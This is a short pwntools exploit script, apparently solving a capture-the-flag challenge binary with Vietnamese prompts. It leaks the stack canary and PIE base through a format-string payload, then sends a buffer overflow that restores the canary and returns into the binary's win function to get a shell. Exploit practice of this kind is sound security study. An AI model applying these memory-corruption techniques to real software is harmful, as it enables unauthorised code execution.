#!/usr/bin/env python
from pwn import *

exe = ELF('./basic', checksec=True)

# DEBUGGING
# p = gdb.debug(exe.path, gdbscript='''
# b *vuln 
# b *vuln+251
# b *win
# ''')

p = process(exe.path)

canary_address = 0x7fffffffdd78
buff_address = 0x7fffffffdd20
canary_offset = canary_address - buff_address

p.recvuntil(b'Nhap do dai tin nhan:')
p.sendline(b'-1')

payload1 = b'%19$p.%21$p'
p.sendline(payload1)

data_leak = p.recvuntil(b'\n', drop=True).strip().split(b'.')
canary = data_leak[0]
saved_rip_leak = data_leak[1]
base_address = int(saved_rip_leak, 16) - 0x13dc
ret_gadget = base_address + 0x101a # ret; gadget
win_func = base_address + exe.symbols['win']

log.info(f'Canary: {canary}')
log.info(f'Canary offset: {canary_offset}')
log.info(f'Saved RIP: {saved_rip_leak}')
log.info(f'Base Address: {hex(base_address)}') # PIE base
log.info(f'Ret Gadget Address: {hex(ret_gadget)}') # for stack alignment
log.info(f'Win Function Address: {hex(win_func)}')

p.sendlineafter(b'2. Khong\n', b'1')
input('Press Enter to continue...')

buf_str = b"Nghi Hoang Khoa dep trai\x00"
payload2 = (
    b'a' * 32 +
    buf_str +
    b'a' * (canary_offset - len(buf_str) - 32) +
    p64(int(canary, 16)) +
    b'a'*8 +
    p64(ret_gadget) +
    p64(win_func)       # return → win
)
print(f"Payload2 length: {len(payload2)}")
print(payload2)
p.sendline(payload2)
input('Press Enter to get shell...')
p.interactive()

